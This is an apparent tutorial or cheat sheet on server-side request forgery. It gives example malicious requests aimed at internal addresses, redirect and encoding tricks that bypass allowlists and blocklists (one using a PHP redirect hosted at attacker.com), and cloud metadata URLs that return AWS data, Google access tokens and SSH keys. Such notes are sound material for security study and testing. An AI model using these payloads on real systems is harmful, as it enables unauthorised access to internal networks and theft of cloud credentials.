**Server-Side Request Forgery (SSRF)**
- SSRFs are becoming scarce, and companies are implementing strict mitigations against them. However, it can be bypassed to achieve a successful attack.
- SSRFs usually occur when the server fetches something from the backend like images, files, databases, etc.

**Identification of Vulnerable Endpoints**
- Once you've identified potentially vulnerable endpoints, provide internal addresses as the URL inputs to these endpoints:
   - localhost
   - 127.0.0.1
   - 0.0.0.0
   - 192.168.0.1
   - 10.0.0.1

**Example Requests**
1. POST `/upload_profile_from_url`
   - Host: public.example.com
   - POST request body:
     ```
     user_id=1234&url=https://192.168.0.1
     ```
2. URL: `https://public.example.com/proxy?url=https://192.168.0.1`

**Detection of Blind SSRFs**
- The easiest way to detect blind SSRFs is through out-of-band techniques. Make the target send requests to an external server you control, and monitor your server logs for requests from the target.
- Alternatively, you can turn your machine into a server using netcat and create a web server with ngrok or similar services.

**Bypass Techniques**
- **Bypass Allowlists**
  - These can usually be bypassed if you find an open redirection vulnerability.
    - Example 1:
      ```
      POST /upload_profile_from_url
      Host: public.example.com
      (POST request body)
      user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1
      ```
    - Example 2:
      ```
      POST /upload_profile_from_url
      Host: public.example.com
      (POST request body)
      user_id=1234&url=https://127.0.0.1/pics.example.com
      ```
- **Bypass Blocklists**
  - URL: `https://public.example.com/proxy?url=https://attacker.com/ssrf`
  - On your server at `https://attacker.com/ssrf`, host a file with the following content:
    ```php
    <?php header("location: http://127.0.0.1"); ?>
    ```
- **Using an IPv6 Address**
- **Encoding**
  - Hex encoding: `https://public.example.com/proxy?url=https://0x7f.0x0.0x0.0x1`
  - Octal encoding: `https://public.example.com/proxy?url=https://0177.0.0.01`
  - Dword format: `https://public.example.com/proxy?url=https://2130706433`

**Impact**
- Perform port scanning.
- Pull instance metadata using IP:
  - URL: `http://169.254.169.254/latest/meta-data/`
  - Various metadata endpoints are available for querying.
  - Complete documentation for the AWS EC2 instance metadata API can be found at [AWS EC2 Instance Metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html).

**Google Metadata**
- If you detect these headers:
  - Metadata-Flavor: Google
  - X-Google-Metadata-Request: True
- Access the metadata:
  - URL: `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
    - Returns the access token of the default account on the instance.
  - URL: `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys`
    - Returns SSH keys for connecting to other instances in the project.
